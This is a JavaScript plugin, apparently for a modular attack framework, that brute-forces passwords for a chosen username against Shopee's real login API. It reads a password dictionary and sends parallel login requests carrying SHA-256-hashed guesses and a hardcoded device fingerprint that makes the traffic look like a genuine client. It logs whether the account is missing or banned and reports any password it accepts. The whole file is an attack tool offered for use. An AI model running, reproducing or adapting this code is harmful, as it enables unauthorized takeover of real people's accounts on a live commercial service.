// Main
class Plugin {
    constructor(log, info, dependencies){
        this.log = log
        this.platforms = info.platforms
        this.arch = info.arch
        this.fullInfo = info.fullInfo
        this.dependencies = dependencies
    }

    info(){
        return {
            name: "Shopee",
            description: "Fast Shopee bruteforcer.",
            authors: [
                "I2rys"
            ],
            references: [
                "https://github.com/I2rys/SLB"
            ],
            platforms: [
                this.platforms.win
            ],
            arch: this.arch.both,
            options: [
                {
                    name: "username",
                    description: "The username to bruteforce.",
                    default: "admin",
                    required: true
                },
                {
                    name: "dictionary",
                    description: "A path of a file that contains a list of passwords.",
                    required: true
                }
            ],
            disclosureDate: "2022-11-08"
        }
    }

    run(args){
        const { runJobs } = this.dependencies.parallelPark
        const request = this.dependencies.request
        const sha256 = this.dependencies.sha256
        const fs = this.dependencies.fs
        const log = this.log

        return new Promise(async(resolve)=>{
            const dictionary = fs.readFileSync(args.dictionary, "utf8").replace(/\r/g, "").split("\n")

            const password = await runJobs(
                dictionary,
                async(password, index, max)=>{
                    var response = await request.post("https://shopee.ph/api/v4/account/login_by_password", {
                        headers: {
                            "content-type": "application/json"
                        },
                        body: JSON.stringify({ username: args.username, password: sha256(password), support_ivs: true, client_identifier: { security_device_fingerprint: "EhVmsZu4600L95r/RsyzcQ==|T3r1cIpRFGayJE9cKuBn5OEefAWTdchzhNnPEWR8MGPPCiL+/10+zihjElC3PQZG8VcPNzu4yUdktvG5jQu2Ih3g|2x5TGUOZeZLpxbNZ|05|3" } })
                    })

                    response = JSON.parse(response.body)

                    if(response.error === 12){
                        log("w", "The account does not exists.")
                        return resolve()
                    }if(response.error === 9){
                        log("w", "The account is banned.")
                        return resolve()
                    }else{
                        return password
                    }
                }
            )

            password ? log("i", `Valid password found: ${password}`) : log("w", "No valid password found.")

            resolve()
        })
    }
}

module.exports = Plugin